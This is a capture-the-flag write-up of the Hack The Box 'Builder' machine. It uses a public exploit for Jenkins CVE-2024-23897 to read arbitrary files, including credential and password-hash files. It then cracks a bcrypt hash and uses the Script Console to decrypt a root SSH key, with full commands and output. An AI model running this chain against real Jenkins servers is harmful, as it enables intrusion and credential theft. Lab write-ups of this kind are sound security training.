
**Date:** 2026-05-15

**Difficulty:** Medium

**Tags:** #linux #htb #ctf #jenkins #CVE-2024-23897

---
## Enumeration

We start by running an aggressive Nmap scan to identify open ports and services on the target.

```Bash
┌──(kali㉿kali)-[~/Desktop/htb/builder]
└─$ sudo nmap -p- -sCV -O --min-rate 5000 10.129.230.220
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-15 16:23 +0200
Nmap scan report for 10.129.230.220
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Jetty(10.0.18)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Dashboard [Jenkins]
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.23 seconds
```

The scan reveals a Jenkins instance running on port `8080`. Checking the web interface confirms the version is Jenkins 2.441.

![[Builder1.png]]

## Vulnerability Discovery & Exploitation

Jenkins version 2.441 is vulnerable to **CVE-2024-23897**, an Arbitrary File Read vulnerability via the built-in command-line interface (CLI). We clone a public exploit for this CVE ([Maalfer/CVE-2024-23897](https://github.com/Maalfer/CVE-2024-23897/tree/main)).

```Bash
┌──(kali㉿kali)-[~/Desktop/htb/builder]
└─$ git clone https://github.com/Maalfer/CVE-2024-23897.git
┌──(kali㉿kali)-[~/Desktop/htb/builder]
└─$ cd CVE-2024-23897 
```

First, we verify the Arbitrary File Read by extracting `/etc/passwd`:

```Bash
┌──(kali㉿kali)-[~/Desktop/htb/builder/CVE-2024-23897]
└─$ python CVE-2024-23897.py 10.129.230.220 8080 /etc/passwd                       
root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent "jenkins:x:1000:1000::/var/jenkins_home:/bin/bash" exists.
...
```

### Enumerating Jenkins Internal Files

After doing some quick online research regarding the default directory structure of a Jenkins server, I discovered that user configurations are typically stored under `/var/jenkins_home/users/`, with an index file named `users.xml` mapping usernames to their specific hashed directory names.

We use the exploit to read `users.xml`:

```Bash
┌──(kali㉿kali)-[~/Desktop/htb/builder/CVE-2024-23897]
└─$ python CVE-2024-23897.py 10.129.230.220 8080 /var/jenkins_home/users/users.xml
...
      <string>jennifer_12108429903186576833</string>: No such agent "      <string>jennifer_12108429903186576833</string>" exists.
...
```

This reveals the directory for the user `jennifer`. Next, we extract her `config.xml` to find her password hash:

```Bash
┌──(kali㉿kali)-[~/Desktop/htb/builder/CVE-2024-23897]
└─$ python CVE-2024-23897.py 10.129.230.220 8080 /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
...
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>: No such agent "      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>" exists.
...
```

We also read the global `credentials.xml` file, which yields an encrypted SSH private key belonging to the `root` user:

```Bash
┌──(kali㉿kali)-[~/Desktop/htb/builder/CVE-2024-23897]
└─$ python CVE-2024-23897.py 10.129.230.220 8080 /var/jenkins_home/credentials.xml                               
...
          <username>root</username>: No such agent "          <username>root</username>" exists.
...
            <privateKey>{AQAAABAAAAowLrfCrZx9baWliwrtCiwCyztaYVoYdkPrn5qEEYDqj5frZLuo...}</privateKey>
...
```

## Cracking & Initial Web Access

We save Jennifer's bcrypt hash and use John the Ripper with `rockyou.txt` to crack it:

```Bash
┌──(kali㉿kali)-[~/Desktop/htb/builder]
└─$ echo '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a' > hash.txt
┌──(kali㉿kali)-[~/Desktop/htb/builder]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess         (?)     
1g 0:00:00:00 DONE (2026-05-15 16:42) 7.142g/s 85.71p/s 85.71c/s 85.71C/s 123456..daniel
```

With the password `princess`, we successfully authenticate to the Jenkins web dashboard as Jennifer.

![[Builder2.png]]

## Privilege Escalation (Direct to Root)

We initially tried to reuse Jennifer's credentials via SSH, but access was denied.

```Bash
┌──(kali㉿kali)-[~/Desktop/htb/builder]
└─$ ssh jennifer@10.129.230.220
jennifer@10.129.230.220's password: 
Permission denied, please try again.
```

Since we have access to the Jenkins dashboard, we can navigate to the **Jenkins Script Console** (`Manage Jenkins >> Script Console`). Because Groovy scripts executed here run within the Jenkins JVM context, it inherently has access to the server's master decryption keys.

We use a simple Groovy command to decrypt the encrypted root SSH key we found earlier in `credentials.xml`:

```Groovy
println hudson.util.Secret.decrypt("{AQAAABAAAAowLrfCrZx9baWliwrtCiwCyztaYVoYdkPrn5qEEYDqj5frZLuo...}")
```

This successfully outputs the plaintext RSA private key for the `root` user:

```Plaintext
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
iGFOXbo3+1sSg1AAAADHJvb3RAYnVpbGRlcgECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

We save the output to a file named `sshkey`, assign the correct permissions (`chmod 600 sshkey`), and SSH directly into the machine as `root`. Because we skipped standard user access entirely, we are able to grab both the `root.txt` and `user.txt` flags at the exact same time.

```Bash
┌──(kali㉿kali)-[~/Desktop/htb/builder]
└─$ ssh -i sshkey root@10.129.230.220
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-94-generic x86_64)
...
root@builder:~# id
uid=0(root) gid=0(root) groups=0(root)

root@builder:~# cat root.txt
c6a370ea19417b39ebdd73c98a865b4c

root@builder:~# cd /home/jennifer/
root@builder:/home/jennifer# cat user.txt 
4765d57bd57fe3608b1ab59bbab576c2
```